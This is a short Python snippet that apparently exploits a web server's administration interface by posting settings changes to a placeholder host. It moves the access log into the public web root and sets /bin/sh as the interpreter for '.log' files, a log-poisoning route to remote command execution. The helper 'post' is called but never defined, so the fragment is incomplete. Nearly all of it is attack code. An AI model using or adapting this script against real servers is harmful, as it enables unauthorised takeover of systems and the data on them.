import http.client
conn = http.client.HTTPConnection('server.invalid', 9999)
conn.request('POST', '/settings', 'apply=1')
post(conn, "/hosts/host@0/edit/log", {"file": "/srv/web/htdocs/access.log", "format": "combined"})
post(conn, "/hosts/host@0/edit/scripting/interpreters/interpreter@0/edit", {"file": "/bin/sh", "extension": "log"})
